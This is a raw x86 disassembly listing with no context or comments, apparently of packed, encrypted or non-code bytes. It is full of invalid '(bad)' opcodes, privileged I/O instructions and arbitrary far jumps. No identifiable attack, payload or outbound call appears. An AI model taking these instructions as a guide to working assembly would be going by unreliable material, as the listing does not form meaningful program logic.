  4169a6:	pop    ebp
  4169a7:	mov    edx,0xc118ba19
  4169ac:	ss stos DWORD PTR es:[edi],eax
  4169ae:	in     al,dx
  4169af:	pop    ebp
  4169b0:	lods   eax,DWORD PTR ds:[esi]
  4169b1:	push   cs
  4169b2:	push   esp
  4169b3:	clc    
  4169b4:	stos   BYTE PTR es:[edi],al
  4169b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169b6:	add    esi,DWORD PTR [esi]
  4169b8:	and    eax,0xf9390a23
  4169bd:	mov    ecx,0x75f99968
  4169c2:	pop    DWORD PTR [ebx]
  4169c4:	mov    esp,0x5e092fec
  4169c9:	pop    edi
  4169ca:	lds    ecx,FWORD PTR [ebx]
  4169cc:	dec    esp
  4169cd:	ins    DWORD PTR es:[edi],dx
  4169ce:	and    eax,0x79308aa5
  4169d3:	inc    ebx
  4169d4:	cdq    
  4169d5:	inc    ecx
  4169d6:	jne    0x4169d1
  4169d8:	or     DWORD PTR [eax+0x7ca855ce],ebp
  4169de:	inc    edx
  4169df:	cld    
  4169e0:	push   ss
  4169e1:	sbb    ch,BYTE PTR [edi-0x3a9ba520]
  4169e7:	fdivr  QWORD PTR [esi+0x4f]
  4169ea:	enter  0x7258,0x9
  4169ee:	adc    eax,DWORD PTR [esi+0x78]
  4169f1:	(bad)  
  4169f2:	mov    edi,0x7eba6a24
  4169f7:	arpl   si,dx
  4169f9:	outs   dx,DWORD PTR ds:[esi]
  4169fa:	nop
  4169fb:	ror    ch,0xaa
  4169fe:	ret    
  4169ff:	push   cs
  416a00:	mov    bl,0x96
  416a02:	mov    ecx,0x14009f4a
  416a07:	int3   
  416a08:	mov    dh,0xfb
  416a0a:	xchg   DWORD PTR [esi-0xa221392],ebp
  416a10:	adc    eax,0xfdb9782a
  416a15:	dec    esp
  416a16:	push   esp
  416a17:	pop    eax
  416a18:	inc    ebx
  416a19:	mov    BYTE PTR [edx-0x79652783],dl
  416a1f:	aaa    
  416a20:	shl    edx,1
  416a22:	sbb    bh,cl
  416a24:	xchg   esp,esp
  416a26:	retf   0x3a4e
  416a29:	jge    0x4169c6
  416a2b:	push   ebx
  416a2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a2d:	or     DWORD PTR [edx],ecx
  416a2f:	repz jns 0x416a91
  416a32:	push   edi
  416a33:	mov    eax,ds:0x7c59b80c
  416a38:	inc    DWORD PTR [ebp-0x66912ba6]
  416a3e:	ret    
  416a3f:	inc    esp
  416a41:	loop   0x416a72
  416a43:	int    0x1f
  416a45:	sub    al,0x87
  416a47:	cmc    
  416a48:	jle    0x4169f0
  416a4a:	jecxz  0x416abc
  416a4c:	cwde   
  416a4d:	pop    ebx
  416a4e:	bnd jmp 0x37e66338
  416a54:	retf   
  416a55:	xor    ecx,DWORD PTR [edi]
  416a57:	sbb    al,BYTE PTR [edi]
  416a59:	adc    BYTE PTR [eax-0x26fb14cc],ch
  416a5f:	push   eax
  416a60:	adc    al,0x56
  416a62:	adc    esp,DWORD PTR [ebx]
  416a64:	jnp    0x416a2b
  416a66:	aaa    
  416a67:	jo     0x416a7e
  416a69:	push   ecx
  416a6a:	push   ds
  416a6b:	add    ch,0x63
  416a6e:	retf   
  416a6f:	adc    ch,BYTE PTR [ecx+0x33]
  416a72:	sbb    BYTE PTR [eax+0x6],0xa9
  416a76:	cld    
  416a77:	scas   al,BYTE PTR es:[edi]
  416a78:	mov    ch,0xc2
  416a7a:	jae    0x416a73
  416a7c:	sub    al,0xc7
  416a7f:	sub    DWORD PTR ds:0x6872ec8e,ebx
  416a85:	pop    ss
  416a86:	aas    
  416a87:	mov    al,0x83
  416a89:	pop    esp
  416a8a:	jmp    0x7d78:0xd0735b21
  416a91:	mov    esp,0xececfe7f
  416a96:	in     eax,dx
  416a97:	and    eax,eax
  416a99:	or     dh,BYTE PTR [bx+di]
  416a9c:	adc    al,0xdd
  416a9e:	popa   
  416a9f:	xchg   esp,eax
  416aa0:	mov    ecx,0xebdf4f9
  416aa5:	fcmovnb st,st(1)
  416aa7:	lock fimul WORD PTR [ebx+0x4e]
  416aab:	ficom  DWORD PTR [edx+ecx*2-0x190f1923]
  416ab2:	pushf  
  416ab3:	in     eax,0x59
  416ab5:	sub    DWORD PTR [edi-0x5b],esi
  416ab8:	mov    al,0x2b
  416aba:	push   ecx
  416abb:	pop    ebx
  416abc:	neg    DWORD PTR ss:[edi+0x41]
  416ac0:	aam    0x91
  416ac2:	and    ebx,ebp
  416ac4:	es fucomi st,st(3)
  416ac7:	shl    BYTE PTR [edx+0x38],1
  416aca:	xor    DWORD PTR [ecx],eax
  416acc:	clc    
  416acd:	cld    
  416ace:	repnz loope 0x416a96
  416ad1:	mov    ah,0xf
  416ad3:	push   ebp
  416ad5:	call   0x9a07f358
  416ada:	jmp    0x416af0
  416adc:	xor    eax,0xea744f94
  416ae1:	ret    0xcbbd
  416ae4:	xchg   DWORD PTR [ecx-0x4d],ecx
  416ae7:	or     al,0xfb
  416ae9:	lock xor BYTE PTR [ebx+0x409d5478],bh
  416af0:	mov    cl,0xd3
  416af2:	enter  0x3274,0x1a
  416af6:	lahf   
  416af7:	aam    0x24
  416af9:	repnz dec esi
  416afb:	ins    DWORD PTR es:[edi],dx
  416afc:	retf   
  416afd:	aaa    
  416afe:	xchg   ebx,eax
  416aff:	cwde   
  416b00:	shr    BYTE PTR [ecx],0x1
  416b03:	sub    BYTE PTR [esi-0x3e],cl
  416b06:	lods   eax,DWORD PTR ds:[esi]
  416b07:	xor    eax,0x8333807e
  416b0c:	pop    ecx
  416b0d:	or     bh,BYTE PTR [ebx]
  416b0f:	mov    dl,0x9e
  416b11:	retf   
  416b12:	aam    0x5c
  416b14:	dec    esp
  416b15:	fsubr  QWORD PTR [ecx-0x1b]
  416b18:	or     al,0xea
  416b1a:	push   ebx
  416b1b:	retf   
  416b1c:	je     0x416b04
  416b1e:	lods   eax,DWORD PTR ds:[esi]
  416b1f:	jne    0x416b55
  416b21:	add    eax,0xc7b00591
  416b26:	das    
  416b27:	push   ecx
  416b28:	push   DWORD PTR ds:0x6db91fa2
  416b2e:	dec    ebp
  416b2f:	test   eax,0x606b7ee6
  416b34:	add    DWORD PTR ds:0x89184244,ebx
  416b3a:	mov    ebp,0x58b37981
  416b3f:	mov    ecx,0x4c2da202
  416b44:	sub    ebx,edi
  416b46:	pop    ebp
  416b47:	jbe    0x416b9e
  416b49:	(bad)  
  416b4a:	xchg   esi,eax
  416b4b:	dec    eax
  416b4c:	sub    al,0x9d
  416b4e:	cmp    BYTE PTR [ebx],0x76
  416b51:	pop    ebx
  416b52:	mov    ds:0xdf867686,eax
  416b57:	add    ecx,DWORD PTR [bp+si-0x1ded]
  416b5c:	push   eax
  416b5d:	aad    0x2b
  416b5f:	jns    0x416aec
  416b61:	adc    al,ah
  416b63:	cmp    DWORD PTR [ebx],edx
  416b65:	xchg   BYTE PTR [esi-0x7bea8745],ch
  416b6b:	test   BYTE PTR [ecx],ah
  416b6d:	hlt    
  416b6e:	mov    esi,0xb1211152
  416b73:	inc    edi
  416b74:	pop    edi
  416b75:	mov    ds:0xd64a74b4,eax
  416b7a:	xor    DWORD PTR [esi+0x7a],ebp
  416b7d:	xlat   BYTE PTR ds:[ebx]
  416b7e:	push   0x6c
  416b80:	cvtps2pd xmm3,QWORD PTR [ecx-0x6546d047]
  416b87:	pop    DWORD PTR [edi]
  416b89:	test   eax,0xb83cd7e5
  416b8e:	mov    eax,0xb78ed3
  416b93:	dec    eax
  416b94:	cli    
  416b95:	leave  
  416b96:	loop   0x416b7a
  416b98:	push   ebp
  416b99:	dec    ebp
  416b9a:	sbb    BYTE PTR [eax],bl
  416b9c:	push   0xbda135a5
  416ba1:	push   ds
  416ba2:	mov    cl,0x59
  416ba4:	int3   
  416ba5:	(bad)  
  416ba6:	dec    ebp
  416ba7:	cmp    ebp,edx
  416ba9:	cmp    BYTE PTR [eax+0x7602dbd1],cl
  416baf:	mov    al,ss:0x87e4e4a9
  416bb5:	dec    ecx
  416bb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bb7:	(bad)  
  416bb8:	sub    DWORD PTR [eax+0x57cc1c31],ecx
  416bbe:	retf   
  416bbf:	adc    bh,bh
  416bc1:	cmp    BYTE PTR [esi-0x10ecd4dc],al
  416bc7:	mov    ecx,0xe1023821
  416bcc:	outs   dx,BYTE PTR ds:[esi]
  416bcd:	(bad)  
  416bce:	mul    DWORD PTR [esi]
  416bd0:	mov    ecx,0x32f42454
  416bd5:	xchg   esi,eax
  416bd6:	ss ds call 0x31ba:0xd4b303bb
  416bdf:	pop    ebx
  416be0:	repz or edi,DWORD PTR [ebx+0x7f296a0b]
  416be7:	cs cld 
  416be9:	jmp    0x416b83
  416beb:	out    dx,al
  416bec:	shl    DWORD PTR [ecx],0x28
  416bef:	rcl    dh,cl
  416bf1:	lea    ecx,[eax]
  416bf3:	inc    ecx
  416bf4:	test   DWORD PTR [ebx+ecx*4],edx
  416bf7:	ret    0xc76f
  416bfa:	lock sahf 
  416bfc:	cmp    bl,BYTE PTR [esi+ecx*2-0x1766fde7]
  416c03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c04:	pushf  
  416c05:	xor    eax,0xb30df457
  416c0a:	and    cl,BYTE PTR [ebp+ebx*8+0x1a685b97]
  416c11:	or     al,0x1a
  416c13:	cmp    eax,0x1f20ecb6
  416c18:	cmp    al,0xff
  416c1a:	inc    esi
  416c1b:	arpl   WORD PTR [edi],cx
  416c1d:	in     al,dx
  416c1e:	push   0xae8dd9b3
  416c23:	push   ss
  416c24:	xchg   edi,eax
  416c25:	xor    eax,0x5800d711
  416c2a:	or     BYTE PTR [edx],0xaa
  416c2d:	cmc    
  416c2e:	je     0x416c7d
  416c30:	fbld   TBYTE PTR [ecx+0x612a2819]
  416c36:	sub    DWORD PTR [ebx-0x5e00f647],0x33ae92f8
  416c40:	mov    esp,0x6a8c9965
  416c45:	xchg   edi,eax
  416c46:	mov    edi,0x6822a1d9
  416c4b:	retf   0x5d6c
  416c4e:	mov    eax,0xb7208f7a
  416c53:	jmp    0x416bfb
  416c55:	pop    esp
  416c56:	popf   
  416c57:	and    DWORD PTR [esi-0x5d],ebx
  416c5a:	add    bl,BYTE PTR [bp+di+0xb]
  416c5e:	and    al,0x93
  416c60:	fild   QWORD PTR [edi]
  416c62:	and    eax,0xab806629
  416c67:	fnstcw WORD PTR [ecx+0x578268d9]
  416c6d:	cwde   
  416c6e:	loop   0x416cab
  416c70:	les    esi,FWORD PTR ds:0x930ceb64
  416c76:	cld    
  416c77:	ds jp  0x416c2d
  416c7a:	push   ss
  416c7b:	mov    esp,0xb19e317
  416c80:	jo     0x416c1a
  416c82:	repnz loope 0x416c73
  416c85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c86:	shl    BYTE PTR [ebp+edx*4+0x17ff544c],1
  416c8d:	and    ebp,0xa6907bca
  416c93:	lods   eax,DWORD PTR ds:[esi]
  416c94:	push   edx
  416c95:	or     eax,0x7c7a
	...
  416d12:	add    BYTE PTR [eax],al
  416d14:	sbb    DWORD PTR [edi+ecx*8-0x1],esi
  416d18:	out    dx,eax
  416d19:	(bad)  
  416d1a:	cmp    esi,esi
  416d1c:	repnz sahf 
  416d1e:	mov    ebx,0x4ef7a623
  416d23:	jmp    0x427e09
  416d28:	ins    BYTE PTR es:[edi],dx
  416d29:	pop    es
  416d2a:	add    BYTE PTR [eax],al
  416d2c:	aad    0xe8
  416d2e:	es pop ss
  416d30:	jns    0x416d75
  416d32:	icebp  
  416d33:	sbb    BYTE PTR [edx],0x6f
  416d36:	outs   dx,DWORD PTR ds:[esi]
  416d37:	lds    ebx,FWORD PTR [edx+0x6]
  416d3a:	in     al,dx
  416d3b:	jp     0x416d9c
  416d3d:	jno    0x416d69
  416d3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d40:	loopne 0x416d03
  416d42:	pushf  
  416d43:	hlt    
  416d44:	pop    ds
  416d45:	popa   
  416d46:	loopne 0x416ce2
  416d48:	mov    cl,0x41
  416d4a:	sub    eax,0xd9f8388b
  416d4f:	or     BYTE PTR [ecx-0x68],dl
  416d52:	outs   dx,DWORD PTR ds:[esi]
  416d53:	mov    edx,0xe21a15c7
  416d58:	and    dl,BYTE PTR [ecx]
  416d5a:	sbb    al,0x22
  416d5c:	in     eax,dx
  416d5d:	daa    
  416d5e:	xlat   BYTE PTR ds:[ebx]
  416d5f:	je     0x416d26
  416d61:	add    al,0x7b
  416d63:	or     DWORD PTR [esi-0x21],esp
  416d66:	xor    al,0xda
  416d68:	out    0xc0,al
  416d6a:	mov    edi,DWORD PTR [eax+ecx*8-0x3a]
  416d6e:	cwde   
  416d6f:	jo     0x416d72
  416d71:	loope  0x416d38
  416d73:	sub    al,bh
  416d75:	neg    DWORD PTR [edx]
  416d77:	jmp    0xb755:0xa04a5793
  416d7e:	mov    ebp,0xbad2eb04
  416d83:	shl    DWORD PTR [edx],1
  416d85:	call   0x44ee:0x2efc5f1f
  416d8c:	dec    esp
  416d8d:	(bad)  
  416d8e:	pusha  
  416d8f:	dec    esi
  416d90:	jp     0x416daf
  416d92:	mov    fs,WORD PTR [edx+0x4d74dc8f]
  416d98:	push   ecx
  416d99:	ret    
  416d9a:	xchg   DWORD PTR [ecx+ebp*2-0x5b],esp
  416d9e:	sub    DWORD PTR [ebx+0x6a507f21],esi
  416da4:	jno    0x416d77
  416da6:	xor    DWORD PTR [ebx+0x2ed240fb],ecx
  416dac:	adc    esi,ebx
  416dae:	push   ss
  416daf:	adc    ah,cl
  416db1:	or     DWORD PTR [edx+0x2d],0x52884a9f
  416db8:	ds adc al,0x5e
  416dbb:	adc    al,0x9e
  416dbd:	push   edx
  416dbe:	jg     0x416e04
  416dc0:	cmp    dh,BYTE PTR [edx+0x5d]
  416dc3:	pop    esi
  416dc4:	not    BYTE PTR [eax-0x58]
  416dc7:	pop    edi
  416dc8:	inc    edx
  416dc9:	push   edi
  416dca:	pop    edx
  416dcb:	lods   al,BYTE PTR ds:[esi]
  416dcc:	dec    ecx
  416dcd:	jecxz  0x416e03
  416dcf:	mov    esp,DWORD PTR [ecx-0x47419e14]
  416dd5:	inc    ecx
  416dd6:	xchg   edi,eax
  416dd7:	xchg   ecx,eax
  416dd8:	mov    cl,0xc6
  416dda:	inc    ebp
  416ddb:	dec    ebp
  416ddc:	imul   edi,esp,0x38537475
  416de2:	xchg   ebx,eax
  416de3:	scas   eax,DWORD PTR es:[edi]
  416de4:	outs   dx,BYTE PTR ds:[esi]
  416de5:	mov    ch,BYTE PTR ds:[edi-0x4814f690]
  416dec:	subps  xmm0,XMMWORD PTR [eax-0x393390d4]
  416df3:	mov    WORD PTR ds:0xdf534215,ds
  416df9:	cmp    eax,0xb0b34a57
  416dfe:	hlt    
  416dff:	sub    DWORD PTR [ebp+0x77387eeb],eax
  416e05:	push   ebx
  416e06:	inc    esi
  416e07:	retf   0xf13c
  416e0a:	and    bl,BYTE PTR fs:[edi+0x6b]
  416e0e:	sbb    BYTE PTR [ecx-0x4377606c],ch
  416e14:	pop    ss
  416e15:	(bad)  
  416e17:	repz pop ebx
  416e19:	pop    ebx
  416e1a:	xchg   esp,eax
  416e1b:	jnp    0x416d9d
  416e1d:	xchg   edx,eax
  416e1e:	jns    0x416e93
  416e20:	stc    
  416e21:	sti    
  416e22:	pop    edx
  416e23:	data16 js 0x416e3d
  416e26:	fbstp  TBYTE PTR [ebp-0x2c23b10a]
  416e2c:	shl    BYTE PTR [eax],cl
  416e2e:	cli    
  416e2f:	adc    DWORD PTR [edi-0xc],ebp
  416e32:	jecxz  0x416dc8
  416e34:	add    dh,dh
  416e36:	fisttp WORD PTR [ecx-0x46]
  416e39:	setno  bh
  416e3c:	dec    esp
  416e3d:	fcomp  QWORD PTR [edi]
  416e3f:	ins    BYTE PTR es:[edi],dx
  416e40:	mov    ds:0xc13e846e,eax
  416e45:	dec    eax
  416e46:	in     eax,dx
  416e47:	dec    ebx
  416e48:	mov    ds:0xcbcbe29a,al
  416e4d:	lds    edx,FWORD PTR [edi]
  416e4f:	mov    bl,ah
  416e51:	ins    DWORD PTR es:[edi],dx
  416e52:	ret    0xc552
  416e55:	adc    al,0x20
  416e57:	enter  0x5768,0xe8
  416e5b:	inc    ebx
  416e5c:	test   BYTE PTR [ebx-0x3577fff8],dh
  416e62:	test   eax,0xf63c09ea
  416e67:	push   ss
  416e68:	test   al,0xe5
  416e6a:	je     0x416e2d
  416e6c:	repz xor al,0xd8
  416e6f:	mov    edi,0x4d92007f
  416e74:	sar    BYTE PTR ds:0xa7c56f01,1
  416e7a:	pushw  ds
  416e7c:	nop
  416e7d:	mov    ah,0x33
  416e7f:	jb     0x416e16
  416e81:	xor    al,0x8f
  416e83:	cmc    
  416e84:	or     eax,DWORD PTR [edi-0x1e5a497a]
  416e8a:	mov    edi,0x302339f0
  416e8f:	ffree  st(5)
  416e91:	mov    BYTE PTR [ebx-0x1f39c6a8],ah
  416e97:	aaa    
  416e98:	ins    BYTE PTR es:[edi],dx
  416e99:	out    dx,al
  416e9a:	add    ebp,DWORD PTR [eax-0x20]
  416e9d:	js     0x416ed4
  416e9f:	cmp    edi,edi
  416ea1:	cli    
  416ea2:	into   
  416ea3:	popa   
  416ea4:	fstp   TBYTE PTR [eax+0x6b]
  416ea7:	addr16 das 
  416ea9:	rol    BYTE PTR [ecx+0x68],1
  416eac:	fs xlat BYTE PTR cs:[ebx]
  416eaf:	int    0x61
  416eb1:	nop
  416eb2:	imul   ebx,DWORD PTR [esi-0x1850b6c0],0xffffffe2
  416eb9:	out    dx,eax
  416eba:	outs   dx,DWORD PTR ds:[esi]
  416ebb:	dec    ecx
  416ebc:	push   ds
  416ebd:	out    0xfa,eax
  416ebf:	retf   0xc5b8
  416ec2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ec3:	ficomp WORD PTR [edi+0x14]
  416ec6:	ror    BYTE PTR [ebp+0x3b],1
  416ec9:	push   esp
  416eca:	mov    dh,bh
  416ecc:	sbb    eax,0x3171ecaf
  416ed1:	add    dh,bl
  416ed3:	inc    esi
  416ed4:	mov    ?,WORD PTR [edx+0x11]
  416ed7:	sbb    ah,BYTE PTR [esi]
  416ed9:	lock xchg ebp,eax
  416edb:	test   dl,dl
  416edd:	ret    
  416ede:	lods   eax,DWORD PTR ds:[esi]
  416edf:	call   0xfc03df5f
  416ee4:	ins    BYTE PTR es:[edi],dx
  416ee5:	pop    ebp
  416ee6:	jmp    0x416f65
  416ee8:	lods   eax,DWORD PTR ds:[esi]
  416ee9:	pop    ds
  416eea:	xlat   BYTE PTR ds:[ebx]
  416eeb:	in     al,dx
  416eec:	call   0x5fae:0x734c87e9
  416ef3:	ins    DWORD PTR es:[edi],dx
  416ef4:	xor    al,al
  416ef6:	(bad)  
  416ef7:	mov    ecx,ebx
  416ef9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416efa:	sub    eax,0xbd40c789
  416eff:	pop    edi
  416f00:	stos   BYTE PTR es:[edi],al
  416f01:	lods   eax,DWORD PTR ds:[esi]
  416f02:	(bad)  
  416f03:	and    eax,0xb1a74f1b
  416f08:	push   ds
  416f09:	mov    bl,dh
  416f0b:	inc    edi
  416f0c:	jmp    0xe4ef:0x79152728
  416f13:	and    al,0x14
  416f15:	add    cl,ch
  416f17:	arpl   WORD PTR [ecx+0x6],di
  416f1a:	aaa    
  416f1b:	or     al,BYTE PTR [edx+eiz*4]
  416f1e:	mov    eax,0xfe939934
  416f23:	jae    0x416efa
  416f25:	inc    edx
  416f26:	(bad)  
  416f27:	retf   0x3206
  416f2a:	xchg   edx,eax
  416f2b:	add    BYTE PTR [eax+edx*2+0x3fb30bba],0x55
  416f33:	out    0x6d,al
  416f35:	in     eax,dx
  416f36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f37:	cmp    BYTE PTR [eax+0x6f],dh
  416f3a:	add    al,0xe1
  416f3c:	xchg   ebp,eax
  416f3d:	jne    0x416f10
  416f3f:	push   cs
  416f40:	mov    ds:0xea469df3,al
  416f45:	mov    eax,0x3dec824b
  416f4a:	addr16 dec ebx
  416f4c:	jg     0x416f1d
  416f4e:	out    0xab,eax
  416f50:	sbb    eax,0x5e99a3cc
  416f55:	outs   dx,DWORD PTR ds:[esi]
  416f56:	fs scas eax,DWORD PTR es:[edi]
  416f58:	adc    DWORD PTR [esi-0x6f],esi
  416f5b:	cld    
  416f5c:	test   al,0x9c
  416f5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f5f:	xor    al,0x89
  416f61:	and    al,0xb3
  416f63:	jns    0x416f5c
  416f65:	or     BYTE PTR [ebx-0x5ff7bb62],0xa3
  416f6c:	sbb    al,ah
  416f6e:	push   cs
  416f6f:	jl     0x416fb5
  416f71:	dec    esp
  416f72:	lock in al,dx
  416f74:	push   esp
  416f75:	and    BYTE PTR [eax-0x67a77557],0xce
  416f7c:	leave  
  416f7d:	repnz sub eax,0xa00e8549
  416f83:	mov    ch,0x5e
  416f85:	loope  0x416fef
  416f87:	or     eax,0xa9aac4d
  416f8c:	and    eax,0xc7f3a75b
  416f91:	shl    BYTE PTR [eax-0x11],1
  416f94:	pop    edx
  416f95:	dec    DWORD PTR [esi-0x2a]
  416f98:	inc    ecx
  416f99:	mov    bl,0x78
  416f9b:	sub    dh,BYTE PTR [esi+0x55]
  416f9e:	mov    ebp,0xbed26d49
  416fa3:	xchg   ecx,eax
  416fa4:	retf   
  416fa5:	loop   0x416fac
  416fa7:	and    eax,0x710039e3
  416fac:	and    eax,0xd77118e7
  416fb1:	fcmovne st,st(3)
  416fb3:	push   0xfffffff4
  416fb5:	or     eax,DWORD PTR [ecx+ecx*4-0x3fc80ebd]
  416fbc:	mov    esp,0xd6e4c49f
  416fc1:	sbb    BYTE PTR [edi],0xa3
  416fc4:	push   ebx
  416fc5:	mov    ds:0xb6985da0,eax
  416fca:	xchg   DWORD PTR [edx+0x17],ecx
  416fcd:	add    ebp,edi
  416fcf:	les    edx,FWORD PTR [ebp+0x638851b6]
  416fd5:	add    eax,0x3ecd8a9d
  416fda:	lods   eax,DWORD PTR ds:[esi]
  416fdb:	add    ebx,DWORD PTR [edi]
  416fdd:	mov    dl,0xf9
  416fdf:	shl    ebp,1
  416fe1:	jne    0x416f9a
  416fe3:	xchg   edx,eax
  416fe4:	mov    ds:0xd661506c,al
  416fea:	add    edx,DWORD PTR [ebx-0xb904093]
  416ff0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ff1:	out    dx,al
  416ff2:	in     eax,dx
  416ff3:	and    eax,DWORD PTR [edx-0x66]
  416ff6:	fcom   DWORD PTR [edx]
  416ff8:	call   0x24be:0x4c993ddf
  416fff:	pop    esp
  417000:	xchg   ecx,eax
  417001:	add    al,0x8d
  417003:	je     0x417080
  417005:	ret    0xb23a
  417008:	xor    BYTE PTR [esi+0x7a2e886e],0x55
  41700f:	pop    ebp
  417010:	or     al,0xf0
  417012:	movq   QWORD PTR [edi+edx*2],mm6
  417016:	js     0x416fc3
  417018:	or     al,0x9e
  41701a:	dec    BYTE PTR [eax]
  41701c:	inc    edx
  41701d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41701e:	rol    DWORD PTR [eax],1
  417020:	sar    dh,cl
  417022:	addr16 inc ecx
  417024:	dec    ebp
  417025:	retf   0xf20b
  417028:	cdq    
  417029:	int    0x5f
  41702b:	jle    0x416fd6
  41702d:	adc    eax,0xbb6e98
  417032:	cmp    BYTE PTR [edi-0x72],dh
  417035:	or     al,0xe4
  417037:	pop    ecx
  417038:	jb     0x41707a
  41703a:	loopne 0x41708a
  41703c:	cdq    
  41703d:	dec    esi
  41703e:	sar    DWORD PTR [ebx],cl
  417040:	xchg   edx,eax
  417041:	out    0xa0,al
  417043:	mov    ebp,0xb8a81816
  417048:	dec    eax
  417049:	xchg   edi,eax
  41704a:	(bad)  
  41704b:	cmp    dl,BYTE PTR [edi+ecx*1-0x6e]
  41704f:	dec    edi
  417050:	in     al,0xf
  417052:	je     0x4170ae
  417054:	pop    ebp
  417055:	stos   BYTE PTR es:[edi],al
  417056:	ss stos DWORD PTR es:[edi],eax
  417058:	and    DWORD PTR [ecx],ebp
  41705a:	inc    esp
  41705b:	mov    edi,0x274d2022
  417060:	ins    DWORD PTR es:[edi],dx
  417061:	in     eax,dx
  417062:	xchg   DWORD PTR [esi-0x7c],ebx
  417065:	scas   al,BYTE PTR es:[edi]
  417066:	or     ah,BYTE PTR [edx]
  417068:	and    esi,edx
  41706a:	mov    ebp,0x3f0fcb18
  41706f:	stos   BYTE PTR es:[edi],al
  417070:	sub    cl,0xc3
  417073:	(bad)  
  417074:	fidivr WORD PTR [esp+ecx*4+0x1a]
  417078:	xor    cl,BYTE PTR [edi]
  41707a:	sbb    edx,DWORD PTR [ebp-0x22ed09ed]
  417080:	jmp    0x417022
  417082:	mov    edi,0xc8cc7c89
  417087:	jns    0x4170d2
  417089:	mov    esi,0x9deee0d4
  41708e:	mov    esp,0x8053cb5f
  417093:	cmp    eax,0x977e40d4
  417098:	pop    edx
  417099:	sub    eax,DWORD PTR [edi-0x15e557b1]
  41709f:	je     0x417106
  4170a1:	inc    esp
  4170a2:	test   al,0x7c
  4170a4:	je     0x4170da
  4170a6:	cdq    
  4170a7:	repnz sar DWORD PTR [esi+0x1f],0x35
  4170ac:	aaa    
  4170ad:	pop    es
  4170ae:	addr16 test al,0xa4
  4170b1:	rcr    BYTE PTR [ebx-0xf],0xf5
  4170b5:	fst    QWORD PTR [ebx+0x5b]
  4170b8:	mov    bh,0xe0
  4170ba:	cs into 
  4170bc:	push   edx
  4170bd:	hlt    
  4170be:	fucomp st(3)
  4170c0:	cmp    BYTE PTR [esi+edx*2],bh
  4170c3:	mov    ecx,0x9e760296
  4170c8:	das    
  4170c9:	ret    
  4170ca:	jno    0x41710b
  4170cc:	add    DWORD PTR [esi],esi
  4170ce:	ret    
  4170cf:	adc    al,BYTE PTR [esi+0x2d87afbe]
  4170d5:	arpl   si,bp
  4170d7:	enter  0x8ecc,0xa4
  4170db:	fnsave [ecx-0x47]
  4170de:	mov    edx,0x9964ef91
  4170e3:	popf   
  4170e4:	sar    BYTE PTR [ecx-0x219e4429],1
  4170ea:	pusha  
  4170eb:	push   esi
  4170ec:	push   es
  4170ed:	sbb    al,0x81
  4170ef:	ret    0x66e4
  4170f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170f3:	inc    ecx
  4170f4:	jns    0x417115
  4170f6:	in     al,0x3c
  4170f8:	jge    0x417153
  4170fa:	je     0x4170a9
  4170fc:	sbb    al,0x81
  4170fe:	xlat   BYTE PTR ds:[ebx]
  4170ff:	inc    ebp
  417100:	mov    ah,0xb6
  417102:	push   cs
  417103:	das    
  417104:	data16 cmp cl,cl
  417107:	imul   esi,DWORD PTR [esi+0x115694d5],0x5
  41710e:	and    edx,eax
  417110:	mov    ds:0x7601028,eax
  417115:	pop    edx
  417116:	in     al,dx
  417117:	jae    0x417165
  417119:	call   0xc9c4:0xb8e9be5a
  417120:	nop
  417121:	gs hlt 
  417123:	inc    ebp
  417124:	adc    BYTE PTR [ebp+0xb],bh
  417127:	out    dx,al
  417128:	icebp  
  417129:	adc    DWORD PTR [edx+0x3968f7a3],eax
  41712f:	stc    
  417130:	inc    ecx
  417131:	mov    edx,0x6ff99078
  417136:	js     0x4170cc
  417138:	cld    
  417139:	mov    bh,0x9b
  41713b:	ss cmp al,0xeb
  41713e:	fwait
  41713f:	inc    eax
  417140:	in     eax,0x7d
  417142:	xor    DWORD PTR [edi],esi
  417144:	dec    esp
  417145:	mov    eax,0x3997e6a0
  41714a:	push   eax
  41714b:	push   ss
  41714c:	mov    esi,0xfe3c3fda
  417151:	jg     0x41715f
  417153:	jns    0x41715c
  417155:	inc    edi
  417156:	mov    al,0x7a
  417158:	sub    eax,0x2c627d83
  41715d:	call   0x7f18:0xa94ac637
  417164:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417166:	sub    eax,edi
  417168:	sbb    BYTE PTR [esi],al
  41716a:	cli    
  41716b:	aas    
  41716c:	cmp    BYTE PTR [eax],ch
  41716e:	retf   
  41716f:	xor    ah,BYTE PTR [ecx-0x2b5a1222]
  417175:	pop    ebx
  417176:	call   0x235c:0x9285bf76
  41717d:	push   eax
  41717e:	in     eax,0xbe
  417180:	jne    0x417193
  417182:	ins    BYTE PTR es:[edi],dx
  417183:	xchg   ecx,edi
  417185:	mov    ecx,0x53c36400
  41718a:	(bad)  
  41718b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41718c:	mov    esp,0x5f98d00
  417191:	adc    cl,BYTE PTR [ebx+0x78]
  417194:	jbe    0x4171c8
  417196:	inc    ebx
  417197:	popa   
  417198:	push   0x3c31fd17
  41719d:	jle    0x417164
  41719f:	jne    0x4171ae
  4171a1:	data16 out 0xa6,al
  4171a4:	mov    dl,0xb9
  4171a6:	pop    ebp
  4171a7:	cmp    BYTE PTR [eax],ch
  4171a9:	cmp    esi,DWORD PTR [ecx+0x5be752ec]
  4171af:	sbb    DWORD PTR [edi],edi
  4171b1:	int    0x1
  4171b3:	call   0x6542a1c2
  4171b8:	sbb    DWORD PTR [edi-0x228c1d6c],0x60682e87
  4171c2:	inc    ebp
  4171c3:	push   esi
  4171c4:	inc    ebp
  4171c5:	or     DWORD PTR [esi],edi
  4171c7:	cld    
  4171c8:	loope  0x41723e
  4171ca:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
